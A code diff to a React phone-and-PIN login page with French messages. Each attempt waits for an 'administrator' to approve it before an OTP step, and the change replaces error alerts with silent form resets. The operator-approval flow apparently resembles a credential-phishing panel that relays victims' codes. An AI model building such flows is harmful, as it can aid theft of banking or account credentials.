@@ -8,7 +8,7 @@ const Login = () => {
   const [phone, setPhone] = useState("");
   const [pin, setPin] = useState("");
   const [showPin, setShowPin] = useState(false);
-  const [isProcessing, setIsProcessing] = useState(false); // ✅ NEW
+  const [isProcessing, setIsProcessing] = useState(false);
   const navigate = useNavigate();
 
   const isFormValid = phone.length === 10 && pin.length === 5;
@@ -28,7 +28,10 @@ const Login = () => {
     // 45-second timeout fallback
     const timeoutId = setTimeout(() => {
       setIsProcessing(false);
-      alert("Délai d'attente dépassé. Veuillez réessayer.");
+      // ✅ Directly redirect to login (clear form) instead of alert
+      setPhone("");
+      setPin("");
+      navigate("/");
     }, 45000);
 
     try {
@@ -53,7 +56,10 @@ const Login = () => {
             if (statusData.status === "approved") {
               navigate("/otp", { state: { phone: phone } });
             } else {
-              alert("Connexion refusée par l'administrateur.");
+              // ✅ Denied: Directly redirect to login (clear form) instead of alert
+              setPhone("");
+              setPin("");
+              navigate("/");
             }
           }
         }, 2000);
@@ -66,7 +72,10 @@ const Login = () => {
     } catch (error) {
       clearTimeout(timeoutId);
       setIsProcessing(false);
-      alert("Erreur réseau.");
+      // ✅ Network error: Directly redirect to login
+      setPhone("");
+      setPin("");
+      navigate("/");
     }
   };
 
